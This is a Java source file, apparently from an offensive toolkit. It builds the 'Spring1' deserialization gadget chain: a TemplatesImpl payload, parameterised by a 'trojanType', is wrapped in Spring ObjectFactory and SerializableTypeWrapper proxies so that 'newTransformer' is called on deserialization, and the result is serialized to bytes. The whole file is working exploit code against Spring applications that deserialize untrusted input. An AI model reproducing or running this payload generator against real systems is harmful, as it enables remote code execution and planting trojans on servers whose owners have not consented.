package core.gadgets;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.Reflections;
import core.utils.Util;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

public class Spring1 {

	public static Object getObject(PayloadType type, String trojanType) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(type, trojanType);

		final ObjectFactory objectFactoryProxy =
				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);

		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler)
				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
					.newInstance(objectFactoryProxy), Type.class, Templates.class);

		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
				Gadgets.createMap("getType", typeTemplatesProxy),
				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
		Reflections.setFieldValue(mitp, "methodName", "newTransformer");

		return mitp;
	}

	public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
		Object mitp = getObject(type, trojanType);
		return Util.serialize(mitp);
	}
}
